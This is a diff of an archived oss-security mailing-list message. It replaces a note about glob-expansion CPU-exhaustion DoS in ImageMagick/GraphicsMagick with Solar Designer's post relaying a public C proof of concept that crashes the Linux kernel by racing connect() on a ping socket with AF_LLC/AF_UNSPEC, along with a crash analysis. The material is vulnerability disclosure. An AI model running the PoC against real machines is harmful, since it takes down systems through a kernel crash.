@@ -1,30 +1,82 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/24/7
-Message-ID: <alpine.GSO.2.20.1704241659260.19751@scrappy.simplesystems.org>
-Date: Mon, 24 Apr 2017 17:08:57 -0500 (CDT)
-From: Bob Friesenhahn <bfriesen@...ple.dallas.tx.us>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/24/6
+Message-ID: <20170324202714.GA29241@openwall.com>
+Date: Fri, 24 Mar 2017 21:27:14 +0100
+From: Solar Designer <solar@...nwall.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: remote DoS via CPU exhaustion in anon FTP server glob expansion
+Cc: Vasily Kulikov <segoon@...nwall.com>
+Subject: Linux kernel ping socket / AF_LLC connect() sin_family race
 Content-Type: text/plain; charset=utf-8
 
-There was no mention of ImageMagick and GraphicsMagick, which have 
-their own built-in glob algorithm.
+Hi,
 
-When a matching file exists, a glob expression which takes massive 
-time with zsh, takes virtually no time with ImageMagick/GraphicsMagick 
-(much better than zsh).  However if there is no matching file, then 
-the amount of time required seems unbounded.
+I haven't fully investigated this issue, and the Subject is provisional
+(but will probably get stuck).  I am not yet sure which kernel
+subsystem(s) to blame here (ping sockets? LLC sockets? other/more?), and
+there might be other ways to trigger the issue.
 
-Besides being passed as an explicit argument, glob expressions can be 
-passed as multiple lines in a text file preceded with a '@' character 
-like
+Just off Twitter:
 
-   @filename.txt
+https://twitter.com/danieljiang0415/status/845116665184497664
 
-Any input file name could be a glob expression.
+daniel_jiang
+@danieljiang0415
+google won't fix kernel crash bug, I release the poc now.
+https://github.com/danieljiang0415/android_kernel_crash_poc
 
-Bob
--- 
-Bob Friesenhahn
-bfriesen@...ple.dallas.tx.us, http://www.simplesystems.org/users/bfriesen/
-GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+And the PoC is:
+
+---
+#include <stdio.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <stdlib.h>
+static int sockfd = 0;
+static struct sockaddr_in addr = {0};
+
+void fuzz(void * param){
+    while(1){
+        addr.sin_family = 0;//rand()%42;
+        printf("sin_family1 = %08lx\n", addr.sin_family);
+        connect(sockfd, (struct sockaddr *)&addr, 16);
+    }
+}
+int main(int argc, char **argv)
+{
+    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
+    int thrd;
+    pthread_create(&thrd, NULL, fuzz, NULL);
+    while(1){
+        addr.sin_family = 0x1a;//rand()%42;
+        addr.sin_port = 0;
+        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        connect(sockfd, (struct sockaddr *)&addr, 16);
+        addr.sin_family = 0;
+    }
+    return 0;
+}
+---
+
+I suppose the focus on Android is because it makes ping sockets
+available to users by default, but the bug isn't Android-specific.
+
+By granting ping sockets to a user, I am able to crash a RHEL7'ish
+system with the above PoC quickly.  The crash (at least in my two tests)
+is a NULL pointer dereference in net/ipv4/ping.c: ping_v4_unhash().
+In newer upstream code, e.g. Linux 4.10.5, the function is renamed to
+ping_unhash() since it's shared with IPv6, but is otherwise similar.
+
+The two address families used by the PoC above are AF_UNSPEC and AF_LLC.
+For the latter, net/llc/af_llc.c: llc_ui_connect() checks for AF_LLC and
+then proceeds to overwrite parts of the "struct sockaddr".
+llc_ui_bind() looks similar, so the issue might also be triggerable via
+bind().  These overwrites might be directly related to the crash, or it
+might be something further.  At first glance, these two functions look
+similar in RHEL7 and 4.10.5, so, if relevant, can probably be used to
+trigger the issue on latest upstream as well.
+
+At this point, I think I'll leave further investigation to someone more
+up-to-date on these interfaces and conventions.  I am merely conveying
+the message, which at this point I understand only partially.
+
+Alexander
